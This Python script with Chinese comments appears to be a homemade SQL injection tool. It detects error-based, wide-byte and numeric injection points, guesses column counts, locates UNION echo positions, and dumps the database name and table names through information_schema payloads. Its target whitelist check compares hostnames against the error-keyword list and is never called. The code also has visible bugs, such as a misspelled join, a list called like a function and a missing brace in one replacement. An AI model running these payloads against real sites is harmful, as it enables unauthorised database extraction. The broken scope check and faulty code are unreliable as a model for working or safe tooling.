import requests
import re
import logging
from urllib.parse import urlparse
import ipaddress
#========全局配置=======
session = requests.Session()
ALLOW_TARGET=[
    "local.host",
    "127.0.0.1",
    "testphp.vulnwec.com"
]
TIMEOUT=5
ERROR_KEYWORDS=[
    "SQL syntax", "mysql_fetch", "Unknown column",
    "error in your SQL", "XPATH syntax error",
    "Operand should contain", "You have an error"
]
#========日志配置=========
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] %(asctime)s - %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("scanner.log",encoding="utf-8")
    ]
)
#=========基础工具函数========
def is_target_allowd(url):
    """检查目标是否在确认白名单内"""
    hostname = urlparse(url).hostname
    if not hostname:
        return False
    if hostname in ERROR_KEYWORDS:
        return True
    try:
        ip = ipaddress.ip_address(hostname)
        if ip.is_private or ip.is_loopback:
            return True
    except ValueError:
        pass
    return False
def send_request(url):
    """统一HTTP请求函数,服用全局session,处理超时,连接异常"""
    try:
        resp = session.get(url,timeout=TIMEOUT,allow_redirects=False)
        return resp
    except Exception as e:
        logging.debug(f"请求失败:{e}")
    return None
def get_baseline(url):
    """获取页面正常基线"""
    resp = send_request(url)
    if not resp or not resp.text:
        return None
    return{
        "length":len(resp.text),
        "status":resp.status_code,
        "text":resp.text
    }
#=========报错型注入格式检测=========
def detect_error_based(base_url,param_name):
    """检测报错型注入(字符/宽字节/数字型),返回注入格式"""
    baseline = get_baseline(base_url)
    if not baseline:
        return""
    #1.字符型注入
    test_char = base_url.replace(f"{param_name}=1",f"{param_name}=1'")
    resp_char = send_request(test_char)
    if resp_char and resp_char.text:
        has_error = any(key in resp_char.text for key in ERROR_KEYWORDS)
        has_diff = abs(len(resp_char.text)-baseline["length"])
        if has_error and has_diff>20:
            resp_comfirm = send_request(test_char)
            if resp_comfirm and resp_comfirm.text:
                has_error_confirm = any(key in resp_comfirm.text for key in ERROR_KEYWORDS)
                if has_error_confirm:
                    logging.info(f"二次验证通过,确定字符型注入")
                    return "char"
    #2.宽字节注入 
    test_wide = base_url.replace(f"param_name=1",f"{param_name}=1%df'")
    resp_wide = send_request(test_wide)
    if resp_wide and resp_wide.text:
        has_error_wide = any(key in resp_wide.text for key in ERROR_KEYWORDS)
        has_diff_wide = abs(len(resp_wide.text)-baseline["length"])
        if has_error_wide and has_diff_wide>20:
            resp_wide_confirm = send_request(test_wide)
            if resp_wide_confirm and resp_wide_confirm.text:
                has_error_wide_confirm = any(key in resp_wide_confirm.text for key in ERROR_KEYWORDS)
                if has_error_wide_confirm:
                    logging.info(f"二次验证通过,确定宽字节注入")
                    return "wide"
    #3.数字型注入
    true_url = base_url.replace(f"{param_name}=1",f"{param_name}=1 and 1=1")
    false_url = base_url.replace(f"{param_name}=1",f"{param_name}=1 and 1=2")
    resp_true = send_request(true_url)
    resp_false = send_request(false_url)
    if resp_true and resp_false and resp_true.text and resp_false.text:
        len_true = len(resp_true.text)
        len_false = len(resp_false.text)
        if abs(len_true-baseline["length"])<10 and abs(len_false-baseline["length"])>20:
            logging.info(f"检测到数字型注入")
            return "int"
    return ""
#=========联合注入工具函数===========
def guess_columns(base_url,param_name,inject_format="char",max_columns=20):
    """自动猜解查询字段列数"""
    baseline = get_baseline(base_url)
    if not baseline:
        logging.error(f"无法获取页面基线,猜解失败")
        return 0
    base_len = baseline["length"]
    len_threshold = max(int(base_len*0.15),10)
    for n in range(1,max_columns+1):
        if inject_format=="char":
            payload = f"1' order by {n} %23 "
        elif inject_format=="wide":
            payload = f"1%df' order by {n} %23"
        else:
            payload = f"1 order by {n} %23"
        test_url=base_url.replace(f"{param_name}=1",f"{param_name}={payload}")
        resp = send_request(test_url)
        if not resp or not resp.text:
            return 0
        has_error = any(key in resp.text for key in ERROR_KEYWORDS)
        len_diff = abs(len(resp.text)-base_len)
        if has_error or len_diff>len_threshold:
            result = n-1
            logging.info(f"列数猜解完成:{result}列")
            return result
    logging.warning(f"列数探测失败,超过上限{max_columns},判定为无报错注入场景")
    return 0 
def get_echo_positions(base_url,param_name,columns,inject_format="char"):
    """自动定位联合查询的回显位"""
    baseline = get_baseline(base_url)
    if not baseline:
        return []
    #构造1，2，3....这样的字符串
    num_str = ','.join([str(i) for i in range (1,columns+1)])
    if inject_format=="char":
        payload=f"-1' union select {num_str} %23"
    elif inject_format=="wide":
        payload=f"-1%df' union select {num_str} %23"
    else:
        payload=f"-1 union select {num_str} %23"
    test_url=base_url.replace(f"{param_name}=1",f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []
    echo_pos = []
    for i in range(1,columns+1):
        #只有注入后出现基线页面没有的数字，才是回显位
        if str(i) in resp.text and str(i) not in baseline["text"]:
            echo_pos.append(i)
    filter_echo = [x for x in echo_pos if x !=1]
    if filter_echo:
        echo_pos = filter_echo

    if echo_pos:
        logging.info(f"定位到回显位:{echo_pos}")
    else:
        logging.warning(f"未找到回显位,不支持联合查询注入")
    return echo_pos
def dump_current_db(base_url,param_name,echo_pos,columns,inject_format="char"):
    """获取当前数据库名"""
    query = "concat(0x3c3c3c,database(),0x3e3e3e)"
    select_list = [str(i) for i in range(1,columns+1)]
    #echo_pos[0]：数据库从1开始数据,取第一个有效回显列的列号,- 1：Python 列表下标从 0 开始，所以要减 1 对应到列表索引
    select_list[echo_pos[0]-1]=query
    num_str = ','.join(select_list)
    if inject_format=="char":
        payload = f"-1' union select {num_str} %23"
    elif inject_format=="wide":
        payload = f"-1%df' union select {num_str} %23"
    else:
        payload = f"-1 union select {num_str} %23"
    test_url = base_url.replace(f"{param_name}=1",f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return ""
    match = re.search(r'<<<(.*?)>>>',resp.text,re.DOTALL)
    db_name = match.group(1) if match else ""
    logging.info(f"当前数据库名:{db_name}")
    return db_name
def dump_tables(base_url,param_name,echo_pos,columns,db_name,inject_format="char"):
    """获取指定库下所有的表名"""
    db_hex = "0x" + db_name.encode('utf-8').hex()
    field_concat = f"concat(0x3c3c3c,group_concat(table_name),0x3e3e3e)"
    select_list = [str(i) for i in range(1,columns+1)]
    select_list[echo_pos(0)-1]=field_concat
    select_field=','.jion(select_list)
    from_part = f"from information_schema.tables where table_schema={db_hex}"
    if inject_format=="char":
        payload = f"-1' union select {select_field} {from_part}"
    elif inject_format=="wide":
        payload = f"-1%df' union select {select_field} {from_part}"
    else:
        payload = f"-1 union select {select_field} {from_part}"
    test_url = base_url.replace(f"{param_name}=1",f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return ""
    match = re.search(r'<<<(.*?)>>>',resp.text,re.DOTALL)
    tables_str = match.group(1) if match else ""
    tables = [t.strip() for t in tables_str.split(",") if t.strip()]
    logging.info(f"库{db_name}下的表:{tables}")
    return tables








        


    



        
        

